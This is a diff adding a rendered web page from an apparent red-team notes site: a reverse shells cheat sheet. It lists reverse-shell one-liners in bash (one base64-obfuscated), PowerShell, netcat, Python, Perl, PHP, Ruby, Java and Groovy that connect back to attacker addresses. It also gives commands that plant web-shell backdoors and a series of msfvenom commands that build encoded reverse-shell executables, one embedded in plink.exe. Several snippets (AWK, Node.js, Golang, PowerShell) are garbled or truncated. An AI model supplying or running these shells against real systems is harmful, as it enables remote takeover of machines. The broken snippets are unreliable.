@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reverse Shells Cheat Sheet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Reverse Shells Cheat Sheet | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Reverse Shells Cheat Sheet" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/cheat/shell/" />
+<meta property="og:url" content="http://localhost:4000/notes/cheat/shell/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Reverse Shells Cheat Sheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Reverse Shells Cheat Sheet","url":"http://localhost:4000/notes/cheat/shell/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/impacket/" >Impacket</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/useful/" >Online Resources</a>
+              <a href="/notes/cheat/shell/" class="active">Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" >Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="reverse-shells-cheat-sheet">Reverse Shells Cheat Sheet</h1>
+
+<h3 id="online-reverse-shell-generators">Online Reverse Shell Generators</h3>
+<p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+
+<h3 id="upgrate-reverse-shell-to-interactive-ttys">Upgrate Reverse Shell to Interactive TTYs</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#---Python---</span>
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+
+<span class="c">#---Socat---</span>
+<span class="c">#Kali</span>
+socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
+<span class="c">#Victim</span>
+socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+<span class="c">#---SSTY---</span>
+<span class="c"># In reverse shell</span>
+<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+Ctrl-Z
+<span class="c"># In Kali</span>
+<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nv">$ </span><span class="nb">fg</span>
+<span class="c"># In reverse shell</span>
+<span class="nv">$ </span>reset
+<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nv">$ </span><span class="nb">stty </span>rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></div></div>
+
+<h2 id="basic-reverse-shells">Basic Reverse Shells</h2>
+
+<h3 id="bash">Bash</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.0.0.1/1234 0&gt;&amp;1
+
+<span class="c">#bash in Base64</span>
+<span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE<span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
+
+<h3 id="powershell">Powershell</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-NoP</span><span class="w"> </span><span class="nt">-NonI</span><span class="w"> </span><span class="nt">-W</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-Exec</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nx">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.0.0.1"</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">);</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+
+</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0);</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="socat">Socat</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+
+<span class="c">#Windows</span>
+socat.exe <span class="nt">-d</span> <span class="nt">-d</span> TCP4:10.0.0.1:4444 EXEC:<span class="s1">'cmd.exe'</span>,pipes
+</code></pre></div></div>
+
+<h3 id="telnet">Telnet</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/p<span class="p">;</span> <span class="nb">mknod</span> /tmp/p p <span class="o">&amp;&amp;</span> telnet 10.0.0.1 4444 0/tmp/p
+</code></pre></div></div>
+
+<h3 id="awk">AWK</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'BEGIN  }} while(c != "exit") close(s); }}}}'</span> /dev/null
+</code></pre></div></div>
+
+<h3 id="netcat">Netcat</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/sh 10.0.0.1 1234
+</code></pre></div></div>
+
+<h3 id="python">Python</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">
+​import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((</span><span class="sh">"</span><span class="s">10.0.0.1</span><span class="sh">"</span><span class="s">,1234));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="s">]);
+​</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h3 id="perl">Perl</h3>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="p">'</span><span class="s1">
+​use Socket;
+$i="10.0.0.1";
+$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+  open(STDIN,"&gt;&amp;S");
+  open(STDOUT,"&gt;&amp;S");
+  open(STDERR,"&gt;&amp;S");
+  exec("/bin/sh -i");
+};
+​</span><span class="p">'</span>
+</code></pre></div></div>
+
+<h3 id="php">PHP</h3>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'
+​$sock=fsockopen("10.0.0.1",1234);
+exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");
+​'</span>
+</code></pre></div></div>
+
+<h3 id="ruby">Ruby</h3>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'
+​f=TCPSocket.open("10.0.0.1",1234).to_i;
+exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f);
+​'</span>
+</code></pre></div></div>
+
+<h3 id="java">Java</h3>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="nc">String</span><span class="o">[]);</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+</code></pre></div></div>
+
+<h3 id="nodejs">Node.js</h3>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">());</span><span class="k">return</span> <span class="sr">/a/</span><span class="p">;}})();</span>
+</code></pre></div></div>
+
+<h3 id="golang">Golang</h3>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="err">'</span><span class="k">package</span> <span class="n">main</span><span class="p">;</span><span class="k">import</span><span class="s">"os/exec"</span><span class="p">;</span><span class="k">import</span><span class="s">"net"</span><span class="p">;</span><span class="k">func</span> <span class="n">main</span><span class="p">()</span><span class="err">'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="k">go</span> <span class="o">&amp;&amp;</span> <span class="k">go</span> <span class="n">run</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="k">go</span> <span class="o">&amp;&amp;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="k">go</span>
+</code></pre></div></div>
+
+<h3 id="groovy-script">Groovy Script</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String host <span class="o">=</span> <span class="s2">"10.8.10.235"</span><span class="p">;</span>
+int port <span class="o">=</span> 4445<span class="p">;</span>
+String cmd <span class="o">=</span> <span class="s2">"/bin/bash"</span><span class="p">;</span>
+Process p <span class="o">=</span> new ProcessBuilder<span class="o">(</span>cmd<span class="o">)</span>.redirectErrorStream<span class="o">(</span><span class="nb">true</span><span class="o">)</span>.start<span class="o">()</span><span class="p">;</span>
+Socket s <span class="o">=</span> new Socket<span class="o">(</span>host, port<span class="o">)</span><span class="p">;</span>
+InputStream pi <span class="o">=</span> p.getInputStream<span class="o">()</span>, pe <span class="o">=</span> p.getErrorStream<span class="o">()</span>, si <span class="o">=</span> s.getInputStream<span class="o">()</span><span class="p">;</span>
+OutputStream po <span class="o">=</span> p.getOutputStream<span class="o">()</span>, so <span class="o">=</span> s.getOutputStream<span class="o">()</span><span class="p">;</span>
+<span class="k">while</span> <span class="o">(!</span>s.isClosed<span class="o">())</span> <span class="o">{</span>
+    <span class="k">while</span> <span class="o">(</span>pi.available<span class="o">()</span> <span class="o">&gt;</span> 0<span class="o">)</span> so.write<span class="o">(</span>pi.read<span class="o">())</span><span class="p">;</span>
+    <span class="k">while</span> <span class="o">(</span>pe.available<span class="o">()</span> <span class="o">&gt;</span> 0<span class="o">)</span> so.write<span class="o">(</span>pe.read<span class="o">())</span><span class="p">;</span>
+    <span class="k">while</span> <span class="o">(</span>si.available<span class="o">()</span> <span class="o">&gt;</span> 0<span class="o">)</span> po.write<span class="o">(</span>si.read<span class="o">())</span><span class="p">;</span>
+    so.flush<span class="o">()</span><span class="p">;</span>
+    po.flush<span class="o">()</span><span class="p">;</span>
+    Thread.sleep<span class="o">(</span>50<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+p.destroy<span class="o">()</span><span class="p">;</span>
+s.close<span class="o">()</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="web-shells-kali">Web Shells (Kali)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#JSP</span>
+<span class="nb">cp</span> /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp
+
+<span class="c">#ASP</span>
+<span class="nb">cp</span> /usr/share/webshells/asp/cmdasp.asp cmd.asp
+
+<span class="c">#ASP</span>
+<span class="nb">cp</span> /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp
+
+<span class="c">#ASPX</span>
+<span class="nb">cp</span> /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx
+
+<span class="c">#PHP</span>
+<span class="nb">cp</span> /usr/share/webshells/php/simple-backdoor.php cmd.php
+
+<span class="c">#PHP</span>
+<span class="nb">cp</span> /usr/share/webshells/php/qsd-php-backdoor.php cmd.php
+
+<span class="c">#PHP</span>
+<span class="nb">cp</span> /usr/share/webshells/php/php-backdoor.php cmd.php
+
+<span class="c">#Perl (CGI)</span>
+<span class="nb">cp</span> /usr/share/webshells/perl/perlcmd.cgi cmd.cgi
+</code></pre></div></div>
+
+<h2 id="msfvenom-reverse-shells">msfvenom Reverse Shells</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#---Windows X86---</span>
+<span class="c">#Reverse TCP Shell</span>
+msfvenom <span class="nt">-a</span> x86 –platform Windows <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;&lt; <span class="o">&gt;&gt;</span> <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-b</span> ‘<span class="se">\x</span>00’ <span class="nt">-i</span> 3 <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe
+<span class="c">#Reverse HTTP Shell </span>
+msfvenom <span class="nt">-a</span> x86 –platform Windows <span class="nt">-p</span> windows/meterpreter/reverse_http <span class="nv">LHOST</span><span class="o">=</span>&lt;&lt;<span class="o">&gt;&gt;</span> <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-b</span> ‘<span class="se">\x</span>00’ <span class="nt">-i</span> 3 <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe
+<span class="c">#Reverse HTTPS Shell </span>
+msfvenom <span class="nt">-a</span> x86 –platform Windows <span class="nt">-p</span> windows/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>&lt;&lt;<span class="o">&gt;&gt;</span> <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-b</span> ‘<span class="se">\x</span>00’ <span class="nt">-i</span> 3 <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe
+<span class="c">#Reverse UDP Shell </span>
+msfvenom <span class="nt">-a</span> x86 –platform Windows <span class="nt">-p</span> payload/windows/shell/reverse_udp <span class="nv">LHOST</span><span class="o">=</span>&lt;&lt;<span class="o">&gt;&gt;</span>  <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-b</span> ‘<span class="se">\x</span>00’ <span class="nt">-i</span> 3 <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe
+
+<span class="c">#Windows non staged reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-o</span> non_staged.exe
+
+<span class="c">#Windows Staged (Meterpreter) reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-o</span> meterpreter.exe
+
+<span class="c">#Windows Python reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> python <span class="nt">-o</span> shell.py
+
+<span class="c">#Windows ASP reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> asp <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> shell.asp
+
+<span class="c">#Windows ASPX reverse shell</span>
+msfvenom <span class="nt">-f</span> aspx <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> shell.aspx
+
+<span class="c">#Windows JavaScript reverse shell with nops</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> js_le <span class="nt">-e</span> generic/none <span class="nt">-n</span> 18
+
+<span class="c">#Windows Powershell reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-i</span> 9 <span class="nt">-f</span> psh <span class="nt">-o</span> shell.ps1
+
+<span class="c">#Windows reverse shell excluding bad characters</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nt">-a</span> x86 <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">04"</span> <span class="nt">-e</span> x86/shikata_ga_nai
+
+<span class="c">#Windows x64 bit reverse shell</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
+
+<span class="c">#Windows reverse shell embedded into plink</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-i</span> 9 <span class="nt">-x</span> /usr/share/windows-binaries/plink.exe <span class="nt">-o</span> shell_reverse_msf_encoded_embedded.exe
+
+<span class="c">#PHP reverse shell</span>
+msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> raw <span class="nt">-o</span> shell.php
+
+<span class="c">#Java WAR reverse shell</span>
+msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> war <span class="nt">-o</span> shell.war
+
+<span class="c">#Linux bind shell</span>
+msfvenom <span class="nt">-p</span> linux/x86/shell_bind_tcp <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">20"</span> <span class="nt">-e</span> x86/shikata_ga_nai
+
+<span class="c">#Linux FreeBSD reverse shell</span>
+msfvenom <span class="nt">-p</span> bsd/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> elf <span class="nt">-o</span> shell.elf
+
+<span class="c">#Linux C reverse shell</span>
+msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.10 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> c
+</code></pre></div></div>
+
+<h3 id="reverse-shell-collections">Reverse Shell Collections</h3>
+<p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+
+<h3 id="icmp-reverse-shell">ICMP Reverse Shell</h3>
+<p><a href="https://github.com/krabelize/icmpdoor">https://github.com/krabelize/icmpdoor</a></p>
+
+<h3 id="reverse-shell-over-the-internet-ngrok">Reverse Shell over the Internet (NGROK)</h3>
+<p><a href="https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9">How to catch a reverse shell over the internet</a></p>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
